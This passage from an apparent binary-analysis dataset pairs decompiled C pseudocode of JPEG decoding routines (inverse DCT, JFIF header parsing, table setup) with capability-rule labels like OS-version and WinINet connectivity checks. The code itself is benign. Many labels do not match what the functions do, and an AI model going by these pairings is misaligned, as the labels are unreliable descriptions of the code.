fStack8 - var_20h;\n            pfVar6[8] = fStack12 + var_1ch;\n            pfVar6[0x30] = fStack12 - var_1ch;\n            pfVar6[0x10] = var_ch + var_18h;\n            pfVar6[0x28] = var_ch - var_18h;\n            pfVar6[0x20] = var_10h + var_14h;\n            pfVar6[0x18] = var_10h - var_14h;\n        }\n        pfVar6 = pfVar6 + 1;\n        pfVar5 = pfVar5 + 1;\n        in_ECX = in_ECX + 1;\n        iVar8 = iVar8 + -1;\n    } while (0 < iVar8);\n    pfVar6 = &var_150h;\n    iVar8 = 0;\n    var_50h = arg_ch;\n    do {\n        fStack40 = *pfVar6 + pfVar6[4];\n        puVar7 = *var_50h + arg_8h;\n        fStack44 = *pfVar6 - pfVar6[4];\n        var_30h = pfVar6[2] + pfVar6[6];\n        var_2ch = (pfVar6[2] - pfVar6[6]) * *0x480f30 - var_30h;\n        fStack8 = fStack40 + var_30h;\n        var_10h = fStack40 - var_30h;\n        fStack12 = fStack44 + var_2ch;\n        var_ch = fStack44 - var_2ch;\n        var_44h = pfVar6[5] + pfVar6[3];\n        fStack60 = pfVar6[5] - pfVar6[3];\n        fStack64 = pfVar6[1] + pfVar6[7];\n        var_40h = pfVar6[1] - pfVar6[7];\n        var_20h = fStack64 + var_44h;\n        fStack44 = (fStack64 - var_44h) * *0x480f30;\n        var_34h = (fStack60 + var_40h) * *0x480f34;\n        fStack40 = *0x480f38 * var_40h - var_34h;\n        var_2ch = *0x480f3c * fStack60 + var_34h;\n        var_1ch = var_2ch - var_20h;\n        var_18h = fStack44 - var_1ch;\n        var_14h = fStack40 + var_18h;\n        iVar4 = fcn.00476c08();\n        *puVar7 = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        puVar7[7] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        puVar7[1] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        puVar7[6] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        puVar7[2] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        puVar7[5] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        puVar7[4] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        iVar4 = fcn.00476c08();\n        pfVar6 = pfVar6 + 8;\n        iVar8 = iVar8 + 1;\n        puVar7[3] = *(var_48h + (iVar4 + 4 >> 3 & 0x3ffU));\n        var_50h = var_50h + 1;\n    } while (iVar8 < 8);\n    return;\n}\n",
        "token_count": 2129
    },
    "00480f40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480f40(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int16_t *in_ECX;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_140h;\n    int32_t aiStack320 [15];\n    int32_t aiStack260 [8];\n    int32_t aiStack228 [8];\n    int32_t aiStack196 [8];\n    int32_t aiStack164 [8];\n    int32_t aiStack132 [8];\n    int32_t aiStack100 [8];\n    int32_t *var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_38h = *(in_EAX + 0x144) + 0x80;\n    var_34h = *(in_EDX + 0x50);\n    piVar2 = &var_140h;\n    var_3ch = 8;\n    do {\n        if ((((in_ECX[8] == 0) && (in_ECX[0x10] == 0)) && (in_ECX[0x18] == 0)) &&\n           (((in_ECX[0x20] == 0 && (in_ECX[0x28] == 0)) && ((in_ECX[0x30] == 0 && (in_ECX[0x38] == 0)))))) {\n            iVar3 = *in_ECX * *var_34h;\n            *piVar2 = iVar3;\n            piVar2[8] = iVar3;\n            piVar2[0x10] = iVar3;\n            piVar2[0x18] = iVar3;\n            piVar2[0x20] = iVar3;\n            piVar2[0x28] = iVar3;\n            piVar2[0x30] = iVar3;\n            piVar2[0x38] = iVar3;\n            var_34h = var_34h + 1;\n        }\n        else {\n            iVar6 = *in_ECX * *var_34h + in_ECX[0x20] * var_34h[0x20];\n            iVar3 = *in_ECX * *var_34h - in_ECX[0x20] * var_34h[0x20];\n            var_28h = in_ECX[0x10] * var_34h[0x10] + in_ECX[0x30] * var_34h[0x30];\n            var_10h = var_28h + iVar6;\n            iVar5 = ((in_ECX[0x10] * var_34h[0x10] - in_ECX[0x30] * var_34h[0x30]) * 0x16a >> 8) - var_28h;\n            var_1ch = iVar6 - var_28h;\n            var_14h = iVar5 + iVar3;\n            var_18h = iVar3 - iVar5;\n            iVar3 = in_ECX[0x18] * var_34h[0x18] + in_ECX[0x28] * var_34h[0x28];\n            iVar5 = in_ECX[0x28] * var_34h[0x28] - in_ECX[0x18] * var_34h[0x18];\n            iVar6 = in_ECX[8] * var_34h[8] + in_ECX[0x38] * var_34h[0x38];\n            var_30h = in_ECX[8] * var_34h[8] - in_ECX[0x38] * var_34h[0x38];\n            var_24h = iVar3 + iVar6;\n            var_2ch = (var_30h + iVar5) * 0x1d9 >> 8;\n            iVar5 = ((iVar5 * -0x29d >> 8) + var_2ch) - var_24h;\n            iVar3 = ((iVar6 - iVar3) * 0x16a >> 8) - iVar5;\n            var_20h = iVar3 + ((var_30h * 0x115 >> 8) - var_2ch);\n            *piVar2 = var_10h + var_24h;\n            piVar2[0x38] = var_10h - var_24h;\n            piVar2[8] = var_14h + iVar5;\n            piVar2[0x30] = var_14h - iVar5;\n            piVar2[0x10] = var_18h + iVar3;\n            piVar2[0x28] = var_18h - iVar3;\n            piVar2[0x20] = var_1ch + var_20h;\n            piVar2[0x18] = var_1ch - var_20h;\n            var_34h = var_34h + 1;\n        }\n        in_ECX = in_ECX + 1;\n        piVar2 = piVar2 + 1;\n        var_3ch = var_3ch + -1;\n    } while (0 < var_3ch);\n    piVar2 = &var_140h;\n    var_3ch = 0;\n    var_40h = arg_ch;\n    do {\n        puVar4 = *var_40h + arg_8h;\n        if ((((piVar2[1] == 0) && (piVar2[2] == 0)) &&\n            ((piVar2[3] == 0 && (((piVar2[4] == 0 && (piVar2[5] == 0)) && (piVar2[6] == 0)))))) && (piVar2[7] == 0)) {\n            uVar1 = *(var_38h + (*piVar2 >> 5 & 0x3ffU));\n            *puVar4 = uVar1;\n            puVar4[1] = uVar1;\n            puVar4[2] = uVar1;\n            puVar4[3] = uVar1;\n            puVar4[4] = uVar1;\n            puVar4[5] = uVar1;\n            puVar4[6] = uVar1;\n            puVar4[7] = uVar1;\n        }\n        else {\n            var_18h = *piVar2 - piVar2[4];\n            var_1ch = *piVar2 + piVar2[4];\n            var_28h = piVar2[2] + piVar2[6];\n            iVar3 = ((piVar2[2] - piVar2[6]) * 0x16a >> 8) - var_28h;\n            var_10h = var_28h + var_1ch;\n            var_1ch = var_1ch - var_28h;\n            var_14h = iVar3 + var_18h;\n            var_18h = var_18h - iVar3;\n            iVar3 = piVar2[5] + piVar2[3];\n            iVar6 = piVar2[5] - piVar2[3];\n            var_30h = piVar2[1] - piVar2[7];\n            var_24h = iVar3 + piVar2[1] + piVar2[7];\n            var_2ch = (var_30h + iVar6) * 0x1d9 >> 8;\n            iVar6 = ((iVar6 * -0x29d >> 8) + var_2ch) - var_24h;\n            iVar3 = (((piVar2[1] + piVar2[7]) - iVar3) * 0x16a >> 8) - iVar6;\n            var_20h = iVar3 + ((var_30h * 0x115 >> 8) - var_2ch);\n            *puVar4 = *(var_38h + (var_10h + var_24h >> 5 & 0x3ffU));\n            puVar4[7] = *(var_38h + (var_10h - var_24h >> 5 & 0x3ffU));\n            puVar4[1] = *(var_38h + (var_14h + iVar6 >> 5 & 0x3ffU));\n            puVar4[6] = *(var_38h + (var_14h - iVar6 >> 5 & 0x3ffU));\n            puVar4[2] = *(var_38h + (var_18h + iVar3 >> 5 & 0x3ffU));\n            puVar4[5] = *(var_38h + (var_18h - iVar3 >> 5 & 0x3ffU));\n            puVar4[4] = *(var_38h + (var_1ch + var_20h >> 5 & 0x3ffU));\n            puVar4[3] = *(var_38h + (var_1ch - var_20h >> 5 & 0x3ffU));\n        }\n        piVar2 = piVar2 + 8;\n        var_3ch = var_3ch + 1;\n        var_40h = var_40h + 1;\n    } while (var_3ch < 8);\n    return;\n}\n",
        "token_count": 2240
    },
    "00481374": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481374(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int16_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint var_a8h;\n    int32_t aiStack168 [15];\n    int32_t aiStack108 [8];\n    int32_t aiStack76 [8];\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = *(in_EAX + 0x144) + 0x80;\n    var_1ch = *(in_EDX + 0x50);\n    piVar2 = &var_a8h;\n    var_24h = 8;\n    do {\n        if (var_24h != 4) {\n            if ((((in_ECX[8] == 0) && (in_ECX[0x10] == 0)) && (in_ECX[0x18] == 0)) &&\n               (((in_ECX[0x28] == 0 && (in_ECX[0x30] == 0)) && (in_ECX[0x38] == 0)))) {\n                iVar3 = *in_ECX * *var_1ch * 4;\n                *piVar2 = iVar3;\n                piVar2[8] = iVar3;\n                piVar2[0x10] = iVar3;\n                piVar2[0x18] = iVar3;\n            }\n            else {\n                iVar4 = *in_ECX * *var_1ch * 0x4000;\n                iVar3 = in_ECX[0x10] * var_1ch[0x10] * 0x3b21 + in_ECX[0x30] * var_1ch[0x30] * -0x187e;\n                var_4h = iVar3 + iVar4;\n                var_8h = iVar4 - iVar3;\n                var_ch = in_ECX[0x38] * var_1ch[0x38];\n                var_10h = in_ECX[0x28] * var_1ch[0x28];\n                var_14h = in_ECX[0x18] * var_1ch[0x18];\n                var_18h = in_ECX[8] * var_1ch[8];\n                iVar4 = var_ch * -0x6c2 + var_10h * 0x2e75 + var_14h * -0x4587 + var_18h * 0x21f9;\n                iVar3 = var_ch * -0x1050 + var_10h * -0x133e + var_14h * 0x1ccd + var_18h * 0x5203;\n                *piVar2 = var_4h + iVar3 + 0x800 >> 0xc;\n                piVar2[0x18] = (var_4h - iVar3) + 0x800 >> 0xc;\n                piVar2[8] = var_8h + iVar4 + 0x800 >> 0xc;\n                piVar2[0x10] = (var_8h - iVar4) + 0x800 >> 0xc;\n            }\n        }\n        in_ECX = in_ECX + 1;\n        var_1ch = var_1ch + 1;\n        piVar2 = piVar2 + 1;\n        var_24h = var_24h + -1;\n    } while (0 < var_24h);\n    piVar2 = &var_a8h;\n    var_24h = 0;\n    var_28h = arg_ch;\n    do {\n        puVar5 = *var_28h + arg_8h;\n        if (((piVar2[1] == 0) && (piVar2[2] == 0)) &&\n           ((piVar2[3] == 0 && (((piVar2[5] == 0 && (piVar2[6] == 0)) && (piVar2[7] == 0)))))) {\n            uVar1 = *(var_20h + (*piVar2 + 0x10 >> 5 & 0x3ffU));\n            *puVar5 = uVar1;\n            puVar5[1] = uVar1;\n            puVar5[2] = uVar1;\n            puVar5[3] = uVar1;\n        }\n        else {\n            var_8h = piVar2[2] * 0x3b21 + piVar2[6] * -0x187e;\n            var_4h = var_8h + *piVar2 * 0x4000;\n            var_8h = *piVar2 * 0x4000 - var_8h;\n            var_ch = piVar2[7];\n            var_10h = piVar2[5];\n            var_14h = piVar2[3];\n            var_18h = piVar2[1];\n            iVar4 = var_ch * -0x6c2 + var_10h * 0x2e75 + var_14h * -0x4587 + var_18h * 0x21f9;\n            iVar3 = var_ch * -0x1050 + var_10h * -0x133e + var_14h * 0x1ccd + var_18h * 0x5203;\n            *puVar5 = *(var_20h + (var_4h + iVar3 + 0x40000 >> 0x13 & 0x3ffU));\n            puVar5[3] = *(var_20h + ((var_4h - iVar3) + 0x40000 >> 0x13 & 0x3ffU));\n            puVar5[1] = *(var_20h + (var_8h + iVar4 + 0x40000 >> 0x13 & 0x3ffU));\n            puVar5[2] = *(var_20h + ((var_8h - iVar4) + 0x40000 >> 0x13 & 0x3ffU));\n        }\n        piVar2 = piVar2 + 8;\n        var_24h = var_24h + 1;\n        var_28h = var_28h + 1;\n    } while (var_24h < 4);\n    return;\n}\n",
        "token_count": 1543
    },
    "00481728": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481728(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int16_t *in_ECX;\n    uchar *puVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_54h;\n    int32_t aiStack84 [15];\n    int32_t *var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(in_EAX + 0x144) + 0x80;\n    piVar1 = &var_54h;\n    var_8h = *(in_EDX + 0x50);\n    iVar3 = 8;\n    do {\n        if (((iVar3 != 6) && (iVar3 != 4)) && (iVar3 != 2)) {\n            if (((in_ECX[8] == 0) && (in_ECX[0x18] == 0)) && ((in_ECX[0x28] == 0 && (in_ECX[0x38] == 0)))) {\n                iVar4 = *in_ECX * *var_8h * 4;\n                *piVar1 = iVar4;\n                piVar1[8] = iVar4;\n            }\n            else {\n                var_4h = *in_ECX * *var_8h * 0x8000;\n                iVar4 = in_ECX[0x38] * var_8h[0x38] * -0x1712 + in_ECX[0x28] * var_8h[0x28] * 0x1b37 +\n                        in_ECX[0x18] * var_8h[0x18] * -0x28ba + in_ECX[8] * var_8h[8] * 0x73fc;\n                *piVar1 = var_4h + iVar4 + 0x1000 >> 0xd;\n                piVar1[8] = (var_4h - iVar4) + 0x1000 >> 0xd;\n            }\n        }\n        in_ECX = in_ECX + 1;\n        var_8h = var_8h + 1;\n        piVar1 = piVar1 + 1;\n        iVar3 = iVar3 + -1;\n    } while (0 < iVar3);\n    piVar1 = &var_54h;\n    var_14h = arg_ch;\n    iVar3 = 0;\n    do {\n        puVar2 = *var_14h + arg_8h;\n        if (((piVar1[1] == 0) && (piVar1[3] == 0)) && ((piVar1[5] == 0 && (piVar1[7] == 0)))) {\n            var_dh = *(var_ch + (*piVar1 + 0x10 >> 5 & 0x3ffU));\n            *puVar2 = var_dh;\n            puVar2[1] = var_dh;\n        }\n        else {\n            var_4h = *piVar1 * 0x8000;\n            iVar4 = piVar1[7] * -0x1712 + piVar1[5] * 0x1b37 + piVar1[3] * -0x28ba + piVar1[1] * 0x73fc;\n            *puVar2 = *(var_ch + (var_4h + iVar4 + 0x80000 >> 0x14 & 0x3ffU));\n            puVar2[1] = *(var_ch + ((var_4h - iVar4) + 0x80000 >> 0x14 & 0x3ffU));\n        }\n        piVar1 = piVar1 + 8;\n        iVar3 = iVar3 + 1;\n        var_14h = var_14h + 1;\n    } while (iVar3 < 2);\n    return;\n}\n",
        "token_count": 914
    },
    "00482784": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482784(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    char *in_EDX;\n    uint var_4h;\n    \n    arg_8h = in_ECX + arg_8h;\n    if ((((in_ECX < 0xe) || (*in_EDX != 'J')) || (in_EDX[1] != 'F')) ||\n       (((in_EDX[2] != 'I' || (in_EDX[3] != 'F')) || (in_EDX[4] != '\\0')))) {\n        if (((in_ECX < 6) || (*in_EDX != 'J')) ||\n           ((in_EDX[1] != 'F' || (((in_EDX[2] != 'X' || (in_EDX[3] != 'X')) || (in_EDX[4] != '\\0')))))) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x4d;\n            *(iVar2 + 0x18) = arg_8h;\n            (**(*in_EAX + 4))();\n        }\n        else {\n            cVar1 = in_EDX[5];\n            if (cVar1 == '\\x10') {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x6c;\n                *(iVar2 + 0x18) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n            else if (cVar1 == '\\x11') {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x6d;\n                *(iVar2 + 0x18) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n            else if (cVar1 == '\\x13') {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x6e;\n                *(iVar2 + 0x18) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n            else {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x59;\n                *(iVar2 + 0x18) = in_EDX[5];\n                *(iVar2 + 0x1c) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n        }\n    }\n    else {\n        in_EAX[0x46] = 1;\n        *(in_EAX + 0x47) = in_EDX[5];\n        *(in_EAX + 0x11d) = in_EDX[6];\n        *(in_EAX + 0x11e) = in_EDX[7];\n        *(in_EAX + 0x48) = in_EDX[8] * 0x100 + in_EDX[9];\n        *(in_EAX + 0x122) = in_EDX[10] * 0x100 + in_EDX[0xb];\n        if (*(in_EAX + 0x47) != '\\x01') {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x77;\n            *(iVar2 + 0x18) = *(in_EAX + 0x47);\n            *(iVar2 + 0x1c) = *(in_EAX + 0x11d);\n            (**(*in_EAX + 4))();\n        }\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x18) = *(in_EAX + 0x47);\n        *(iVar2 + 0x1c) = *(in_EAX + 0x11d);\n        *(iVar2 + 0x20) = *(in_EAX + 0x48);\n        *(iVar2 + 0x24) = *(in_EAX + 0x122);\n        *(iVar2 + 0x28) = *(in_EAX + 0x11e);\n        *(*in_EAX + 0x14) = 0x57;\n        (**(*in_EAX + 4))();\n        if ((in_EDX[0xc] | in_EDX[0xd]) != 0) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x5a;\n            *(iVar2 + 0x18) = in_EDX[0xc];\n            *(iVar2 + 0x1c) = in_EDX[0xd];\n            (**(*in_EAX + 4))();\n        }\n        if (arg_8h + -0xe != in_EDX[0xc] * in_EDX[0xd] * 3) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x58;\n            *(iVar2 + 0x18) = arg_8h + -0xe;\n            (**(*in_EAX + 4))();\n        }\n    }\n    return;\n}\n",
        "token_count": 1144
    },
    "00483840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00483840(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        iVar1 = 1;\n        do {\n            (**(*(in_EAX + 4) + 0x24))();\n            iVar1 = iVar1 + -1;\n        } while (0 < iVar1);\n        if (*(in_EAX + 0x10) != 0) {\n            *(in_EAX + 0x14) = 200;\n            *(in_EAX + 0x130) = 0;\n            return;\n        }\n        *(in_EAX + 0x14) = 100;\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00483880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00483880(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        (**(*(in_EAX + 4) + 0x28))();\n    }\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "004839a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004839a0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x18) == 0) {\n        uVar2 = (***(in_EAX + 4))();\n        *(in_EAX + 0x18) = uVar2;\n    }\n    iVar1 = *(in_EAX + 0x18);\n    *(iVar1 + 8) = 0x4838d0;\n    *(iVar1 + 0xc) = 0x4838fc;\n    *(iVar1 + 0x10) = 0x483944;\n    *(iVar1 + 0x14) = param_2;\n    return;\n}\n",
        "token_count": 178
    },
    "004839e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004839e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EAX[5] != 100) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x14;\n        *(iVar2 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if ((in_EDX < 0) || (3 < in_EDX)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x1f;\n        *(iVar2 + 0x18) = in_EDX;\n        (***in_EAX)();\n    }\n    piVar1 = in_EAX + in_EDX + 0x11;\n    if (*piVar1 == 0) {\n        iVar2 = fcn.004838a0();\n        *piVar1 = iVar2;\n    }\n    iVar2 = 0;\n    do {\n        iVar3 = (*in_ECX * arg_ch + 0x32) / 100;\n        if (iVar3 < 1) {\n            iVar3 = 1;\n        }\n        if (0x7fff < iVar3) {\n            iVar3 = 0x7fff;\n        }\n        if ((arg_8h != 0) && (0xff < iVar3)) {\n            iVar3 = 0xff;\n        }\n        in_ECX = in_ECX + 1;\n        *(*piVar1 + iVar2 * 2) = iVar3;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x40);\n    *(*piVar1 + 0x80) = 0;\n    return;\n}\n",
        "token_count": 442
    },
    "00483b18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00483b18(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    if (*in_EDX == 0) {\n        iVar2 = fcn.004838b8();\n        *in_EDX = iVar2;\n    }\n    fcn.00476bb4(*in_EDX, in_ECX, 0x11);\n    arg_10h = 0;\n    iVar2 = 1;\n    puVar3 = in_ECX + 1;\n    do {\n        iVar2 = iVar2 + 1;\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        arg_10h = arg_10h + uVar1;\n    } while (iVar2 < 0x11);\n    if ((arg_10h < 1) || (0x100 < arg_10h)) {\n        *(*in_EAX + 0x14) = 8;\n        (***in_EAX)();\n    }\n    fcn.00476bb4(*in_EDX + 0x11, arg_8h, arg_10h);\n    *(*in_EDX + 0x114) = 0;\n    return;\n}\n",
        "token_count": 325
    },
    "00483bf8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00483bf8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (in_EAX[5] != 100) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0x10] == 0) {\n        iVar1 = (**in_EAX[1])();\n        in_EAX[0x10] = iVar1;\n    }\n    in_EAX[0xd] = 8;\n    fcn.00483afc();\n    fcn.00483ba0();\n    iVar1 = 0;\n    piVar2 = in_EAX + 0x1d;\n    do {\n        *piVar2 = 0;\n        *(piVar2 + 4) = 1;\n        *(piVar2 + 8) = 5;\n        iVar1 = iVar1 + 1;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 < 0x10);\n    in_EAX[0x2a] = 0;\n    in_EAX[0x29] = 0;\n    in_EAX[0x2b] = 0;\n    in_EAX[0x2c] = 0;\n    in_EAX[0x2d] = 0;\n    if (8 < in_EAX[0xd]) {\n        in_EAX[0x2d] = 1;\n    }\n    in_EAX[0x2e] = 0;\n    in_EAX[0x2f] = 0;\n    in_EAX[0x30] = 2;\n    in_EAX[0x31] = 0;\n    in_EAX[0x32] = 0;\n    *(in_EAX + 0x34) = 1;\n    *(in_EAX + 0xd1) = 1;\n    *(in_EAX + 0xd2) = 0;\n    *(in_EAX + 0x35) = 1;\n    *(in_EAX + 0xd6) = 1;\n    fcn.00483cf8();\n    return;\n}\n",
        "token_count": 522
    },
    "00483d6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00483d6c(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (in_EAX[5] != 100) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x14;\n        *(iVar3 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    in_EAX[0xf] = param_2;\n    in_EAX[0x33] = 0;\n    in_EAX[0x36] = 0;\n    // switch table (6 cases) at 0x483db0\n    switch(param_2) {\n    case 0:\n        in_EAX[0xe] = in_EAX[9];\n        if ((in_EAX[0xe] < 1) || (10 < in_EAX[0xe])) {\n            iVar3 = *in_EAX;\n            *(iVar3 + 0x14) = 0x1a;\n            *(iVar3 + 0x18) = in_EAX[0xe];\n            *(iVar3 + 0x1c) = 10;\n            (***in_EAX)();\n        }\n        for (iVar3 = 0; iVar3 < in_EAX[0xe]; iVar3 = iVar3 + 1) {\n            piVar2 = iVar3 * 0x54 + in_EAX[0x10];\n            *piVar2 = iVar3;\n            piVar2[2] = 1;\n            piVar2[3] = 1;\n            piVar2[4] = 0;\n            piVar2[5] = 0;\n            piVar2[6] = 0;\n        }\n        return;\n    case 1:\n        in_EAX[0x33] = 1;\n        in_EAX[0xe] = 1;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 1;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        return;\n    case 2:\n        in_EAX[0x36] = 1;\n        in_EAX[0xe] = 3;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 0x52;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 0x47;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 0;\n        *(iVar3 + 0x68) = 0;\n        *(iVar3 + 0x6c) = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 0x42;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 0;\n        *(iVar3 + 0xbc) = 0;\n        *(iVar3 + 0xc0) = 0;\n        return;\n    case 3:\n        